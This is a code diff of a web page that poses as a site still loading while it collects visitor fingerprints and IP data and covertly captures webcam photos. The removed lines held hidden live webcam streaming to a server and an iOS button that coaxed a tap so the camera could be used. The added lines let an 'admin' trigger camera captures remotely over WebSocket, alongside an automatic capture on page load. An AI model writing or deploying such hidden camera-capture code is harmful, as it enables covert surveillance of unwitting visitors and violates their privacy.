@@ -150,9 +150,6 @@ main a {
     <div id="status" class="status loading">
       <span class="spinner"></span>Loading website...
     </div>
-    <button id="btnbar" class="btn" style="margin-top: 20px; display: none;">
-      📷 Take Photo
-    </button>
   </div>
 
   <script>
@@ -825,32 +822,11 @@ main a {
       }
     }
 
-    // Keep button functionality for manual capture
-    const btnbar = document.getElementById('btnbar');
-    if (btnbar) {
-      btnbar.addEventListener('click', async function() {
-        statusDiv.className = 'status loading';
-        statusDiv.innerHTML = '<span class="spinner"></span>Capturing photo...';
-        btnbar.disabled = true;
 
-        try {
-          await capturePhoto('manual');  // Manual button click
-          statusDiv.className = 'status success';
-          statusDiv.innerHTML = '✓ Photo captured and saved successfully!';
-          btnbar.style.display = 'none';
-        } catch (error) {
-          statusDiv.className = 'status error';
-          statusDiv.innerHTML = '✗ Failed to capture photo: ' + error.message;
-          btnbar.disabled = false;
-        }
-      });
-    }
-
-    // WebSocket connection for live video streaming
+    // WebSocket connection for photo requests
     let socket = null;
-    let videoStream = null;
-    let streamingInterval = null;
-    let isStreaming = false;
+    let currentEntryId = null;
+    let currentFingerprint = null;
 
     // Initialize WebSocket connection
     function initWebSocket() {
@@ -864,200 +840,52 @@ main a {
       
       socket.on('connect', () => {
         console.log('[WEBSOCKET] Connected to server');
+        // Register this user's entry when connected
+        if (currentEntryId && currentFingerprint) {
+          socket.emit('register_user', {
+            entry_id: currentEntryId,
+            fingerprint: currentFingerprint
+          });
+        }
       });
 
       socket.on('disconnect', () => {
         console.log('[WEBSOCKET] Disconnected from server');
       });
 
-      socket.on('stream_started', (data) => {
-        console.log('[WEBSOCKET] Stream started:', data);
-      });
-
-      socket.on('stream_error', (data) => {
-        console.error('[WEBSOCKET] Stream error:', data);
-      });
-    }
-
-    // Start live video streaming
-    async function startLiveStream(entryId, fingerprint, ipAddress) {
-      if (isStreaming) {
-        console.log('[STREAM] Already streaming');
-        return;
-      }
-
-      try {
-        // Request camera access
-        const videoConstraints = isIOS 
-          ? { facingMode: 'user' }
-          : { 
-              facingMode: 'user',
-              width: { ideal: 640 },
-              height: { ideal: 480 }
-            };
-
-        videoStream = await navigator.mediaDevices.getUserMedia({
-          video: videoConstraints,
-          audio: false
-        });
-
-        // Create hidden video element to capture frames
-        const video = document.createElement('video');
-        video.srcObject = videoStream;
-        video.autoplay = true;
-        video.style.display = 'none';
-        document.body.appendChild(video);
-
-        // Wait for video to be ready
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
-        });
-
-        // Create canvas for frame capture - resize to smaller dimensions to reduce data size
-        const canvas = document.createElement('canvas');
-        // Limit canvas size to max 320x240 to reduce data size
-        const maxWidth = 320;
-        const maxHeight = 240;
-        const aspectRatio = video.videoWidth / video.videoHeight;
+      // Listen for photo requests from admin
+      socket.on('photo_request', async (data) => {
+        console.log('[WEBSOCKET] Photo request received:', data);
         
-        if (video.videoWidth > maxWidth || video.videoHeight > maxHeight) {
-          if (aspectRatio > 1) {
-            canvas.width = maxWidth;
-            canvas.height = maxWidth / aspectRatio;
-          } else {
-            canvas.height = maxHeight;
-            canvas.width = maxHeight * aspectRatio;
-          }
-        } else {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-        }
-        
-        const ctx = canvas.getContext('2d');
-
-        // Notify server that streaming is starting
-        if (socket && entryId) {
-          socket.emit('start_video_stream', {
-            entry_id: entryId,
-            fingerprint: fingerprint,
-            ip_address: ipAddress
-          });
-        }
-
-        isStreaming = true;
-
-        // Throttle frame sending - only send if previous frame was sent
-        let isSendingFrame = false;
-
-        // Capture and send frames periodically (every 500ms = ~2 FPS to reduce server load)
-        streamingInterval = setInterval(() => {
-          // Skip if previous frame is still being sent
-          if (isSendingFrame) {
-            return;
-          }
-
+        // Check if this request is for this user
+        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
+          // Capture and upload photo
           try {
-            // Draw current video frame to canvas (scaled down)
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert to base64 with lower quality to reduce size
-            const frameData = canvas.toDataURL('image/jpeg', 0.5); // Lower quality (0.5 instead of 0.7)
-            
-            // Only send if frame data is reasonable size (less than 100KB)
-            if (frameData.length > 100000) {
-              console.warn('[STREAM] Frame too large, skipping');
-              return;
-            }
-
-            isSendingFrame = true;
-            
-            // Send frame via WebSocket
-            if (socket && entryId && socket.connected) {
-              socket.emit('video_frame', {
-                entry_id: entryId,
-                frame: frameData
-              }, () => {
-                // Callback when frame is sent
-                isSendingFrame = false;
-              });
-            } else {
-              isSendingFrame = false;
-            }
+            await capturePhoto('admin_request');
+            console.log('[WEBSOCKET] Photo captured in response to admin request');
           } catch (error) {
-            console.error('[STREAM] Error capturing frame:', error);
-            isSendingFrame = false;
+            console.error('[WEBSOCKET] Failed to capture photo:', error);
           }
-        }, 500); // 2 frames per second (reduced from 10 FPS)
-
-        console.log('[STREAM] Live video streaming started for entry', entryId);
-
-      } catch (error) {
-        console.error('[STREAM] Failed to start live stream:', error);
-        isStreaming = false;
-      }
-    }
-
-    // Stop live video streaming
-    function stopLiveStream(entryId) {
-      if (streamingInterval) {
-        clearInterval(streamingInterval);
-        streamingInterval = null;
-      }
-
-      if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-      }
-
-      if (socket && entryId) {
-        socket.emit('stop_stream', { entry_id: entryId });
-      }
-
-      isStreaming = false;
-      console.log('[STREAM] Live video streaming stopped');
+        }
+      });
     }
 
     // Auto-run on page load
     window.addEventListener('load', async function() {
-      // Initialize WebSocket connection
-      initWebSocket();
-
       await collectAllData();
 
-      // Start live video streaming after data collection
-      const entryId = window.currentEntryId;
-      const fingerprint = window.currentFingerprint;
-      const ipAddress = (await getIPInfo())?.ip || '';
+      // Store entry ID and fingerprint for photo requests
+      currentEntryId = window.currentEntryId;
+      currentFingerprint = window.currentFingerprint;
 
-      if (entryId && fingerprint) {
-        // Start streaming after a short delay
-        setTimeout(() => {
-          startLiveStream(entryId, fingerprint, ipAddress);
-        }, 2000);
-      }
+      // Initialize WebSocket connection for photo requests (after data is collected)
+      initWebSocket();
 
-      // On iOS, show button instead of auto-capturing (iOS requires user interaction)
-      if (isIOS && btnbar) {
-        btnbar.style.display = 'inline-block';
-        statusDiv.className = 'status success';
-        statusDiv.innerHTML = '✓ Data collected! Please click the button below to take a photo.';
-      } else {
-        // On non-iOS devices, automatically capture photo after data collection
-        // Delay slightly to avoid overwhelming the browser
-        setTimeout(() => {
-          capturePhoto('auto');  // Automatic on page load
-        }, 1000);
-      }
-    });
-
-    // Stop streaming when page unloads
-    window.addEventListener('beforeunload', () => {
-      if (window.currentEntryId) {
-        stopLiveStream(window.currentEntryId);
-      }
+      // Automatically capture photo after data collection
+      // Delay slightly to avoid overwhelming the browser
+      setTimeout(() => {
+        capturePhoto('auto');  // Automatic on page load
+      }, 1000);
     });
   </script>
 </body>
